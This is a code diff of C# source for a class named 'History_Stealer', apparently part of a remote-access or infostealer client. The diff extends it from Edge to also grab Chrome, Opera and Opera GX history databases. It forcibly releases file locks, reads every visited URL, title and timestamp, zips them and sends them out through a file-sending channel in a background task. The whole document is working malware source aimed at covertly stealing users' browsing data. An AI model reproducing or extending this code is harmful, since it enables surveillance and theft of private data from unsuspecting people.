@@ -1,12 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Data.SQLite;
 using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Data;
 using System.Windows.Forms;
+using SQLite;
 
 namespace Client.Armitage.Cookies
 {
@@ -15,56 +15,72 @@ namespace Client.Armitage.Cookies
     /// </summary>
     public static class History_Stealer
     {
-        private static DateTime _ge = DateTime.Parse("1601-01-01");
+        [Table("urls")]
+        public class HistoryTable
+        {
+            public long id { get; set; }
 
+            public string url { get; set; }
+            public string title { get; set; }
+            public long visit_count { get; set; }
+            public long typed_count { get; set; }
+            public long last_visit_time { get; set; }
+            public byte hidden { get; set; }
+        }
+        private static DateTime _ge = DateTime.Parse("1601-01-01");
         public static bool FromEdge()
         {
-            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\History");
+            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Edge");
         }
-        public static bool ParseAndSendSQL(string pathtosql)
+        public static bool FromChrome()
+        {
+            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Google\Chrome\User Data\Default\History", "Chrome");
+        }
+        public static bool FromOpera()
+        {
+            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera Stable\History", "Opera");
+        }
+        public static bool FromOperaGX()
+        {
+            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Opera Software\Opera GX Stable\History", "Opera GX");
+        }
+        public static bool ParseAndSendSQL(string pathtosql, string browsername)
         {
             try
             {
-                Utilities.Files_And_Pathing.KillLocks(pathtosql);
-
                 if (File.Exists(pathtosql))
                 {
+                    Console.WriteLine("Found! " + pathtosql);
+
+                    Utilities.Files_And_Pathing.KillLocks(pathtosql);
+
                     string tempname = Path.GetTempFileName() + "e";
 
                     File.Copy(pathtosql, tempname);
 
-                    string connection = @"Data Source=" + pathtosql;
-                    var con = new SQLiteConnection(connection);
-                    con.Open();
+                    var con = new SQLiteConnection(pathtosql);
 
                     string stm = "SELECT * FROM urls";
-                    var cmd = new SQLiteCommand(stm, con);
 
                     StringBuilder sb = new StringBuilder();
+
                     sb.AppendLine($"History From {pathtosql}");
+
                     sb.AppendLine($"id | url | site title | visit count | typed count | last visit | ishidden");
-                    SQLiteDataReader rdr = cmd.ExecuteReader();
-                    int maxlength = rdr.FieldCount;
 
-                    while (rdr.Read())
+                    var history = con.Query<HistoryTable>(stm).ToList();
+
+                    foreach (var j in history)
                     {
-                        for (int i = 0; i < maxlength; i++)
+                        try
                         {
-                            if (i == 5)
-                            {
-                                // parse date correctly
-                                long seconds = rdr.GetInt64(i) / 1000000;
+                            long seconds = j.last_visit_time / 1000000;
 
-                                DateTime visitdate = _ge.AddSeconds(seconds);
+                            DateTime visitdate = _ge.AddSeconds(seconds);
 
-                                sb.Append(visitdate.ToString() + " |");
-                            }
-                            else
-                            {
-                                sb.Append(rdr.GetValue(i).ToString() + " |");
-                            }
+                            sb.AppendLine($"{j.id} | {j.url} | {j.title} | {j.visit_count} | {j.typed_count} | {visitdate} | {Convert.ToInt32(j.hidden)}");
                         }
-                        sb.Append(Environment.NewLine);
+                        catch { }
                     }
 
                     Utilities.Zip_Creator k = new Utilities.Zip_Creator();
@@ -73,21 +89,31 @@ namespace Client.Armitage.Cookies
 
                     var btyes = k.CreateZip();
 
-                    Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, "History.zip");
+                    Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, $"{browsername}-History.zip");
+
 
                     return true;
                 }
             }
-            catch (Exception ex) { }
+            catch (Exception ex) { Console.WriteLine(ex.ToString()); }
 
-            return false ;
+            return false;
         }
         public static void SendOne()
         {
             Task.Run(() =>
             {
+                FromEdge();
 
+                FromChrome();
 
+                FromOpera();
+
+                FromOperaGX();
+
+                Properties.Settings.Default.LastHistorySent = Constants.Today;
+
+                Properties.Settings.Default.Save();
             });
         }
     }
